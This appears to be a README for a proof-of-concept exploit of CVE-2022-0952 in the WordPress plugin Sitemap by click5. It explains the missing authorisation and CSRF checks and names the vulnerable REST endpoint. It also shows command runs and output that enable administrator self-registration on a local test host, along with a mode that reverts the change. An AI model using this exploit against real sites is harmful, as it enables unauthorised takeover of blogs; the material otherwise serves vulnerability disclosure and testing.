# CVE-2022-0952
Sitemap by click5 &lt; 1.0.36 - Unauthenticated Arbitrary Options Update

# Description

The plugin does not have authorisation and CSRF checks when updating options via a REST endpoint, and does not ensure that the option to be updated belongs to the plugin. As a result, unauthenticated attackers could change arbitrary blog options, such as the users_can_register and default_role, allowing them to create a new admin account and take over the blog.

# Example Enable Admin & Reg

```
$ python3 CVE-2022-0952.py -u http://192.168.1.131:5555
The plugin version is below 1.0.36.
The plugin version is 1.0.35
Vulnerability check: http://192.168.1.131:5555
Option set successfully: http://192.168.1.131:5555/wp-json/click5_sitemap/API/update_html_option_AJAX
You can now register a user as an admin user. Remember to run --fix yes after you have registered to prevent others exploiting the site.
```

# Example Disable Admin & Reg

```
$ python3 CVE-2022-0952.py -u http://192.168.1.131:5555 --fix yes
Vulnerability check: http://192.168.1.131:5555
Option set successfully: http://192.168.1.131:5555/wp-json/click5_sitemap/API/update_html_option_AJAX
Fixed: You can not longer register
Option set successfully: http://192.168.1.131:5555/wp-json/click5_sitemap/API/update_html_option_AJAX
Fixed: You can not longer register
```
